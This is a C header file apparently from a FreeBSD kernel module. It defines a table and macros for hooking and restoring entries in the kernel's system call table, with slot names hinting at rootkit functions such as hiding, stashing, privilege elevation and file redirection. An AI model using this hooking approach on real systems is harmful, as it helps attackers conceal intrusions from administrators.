#ifndef _SHADOW_SYSENT_H
#define _SHADOW_SYSENT_H

#include <sys/sysent.h>

/*
 * A lookup table stored in kernel space which contains a mapping of system
 * call numbers and functions that have been overridden.
 *
 * Used to hook and restore the sysent table.
 */

#define LOOKUP_INDEX           0
#define DEEPBG_INDEX           1
#define STASH_INDEX            2
#define KNIGHTED_INDEX         3
#define WHISPER_INDEX          4
#define FILE_REDIRECTION_INDEX 5
#define MAX_SHADOWS            6

struct shadow_sysent{
   int syscall_num;              // syscall number in real sysent table
                                 // -1 means no sysent table entry.

   sy_call_t *new_sy_call;       // new function 

   sy_call_t *orig_sy_call;      // original function 
                                 // NULL means no function was overridden.
};

extern struct shadow_sysent shadow_sysent[];

// Insert an entry into the shadow sysent table

#define INSERT_SHADOW_ENTRY(index, sy_call, syscall_num) \
   shadow_sysent[index].syscall_num = syscall_num; \
   if (shadow_sysent[index].orig_sy_call == NULL) \
      shadow_sysent[index].orig_sy_call = shadow_sysent[index].new_sy_call; \
   shadow_sysent[index].new_sy_call = sy_call;

// Undo an entry from the shadow sysent table

#define UNDO_SHADOW_ENTRY(index) \
   shadow_sysent[index].syscall_num = -1; \
   if (shadow_sysent[index].orig_sy_call != NULL) \
      shadow_sysent[index].new_sy_call = shadow_sysent[index].orig_sy_call;

#endif
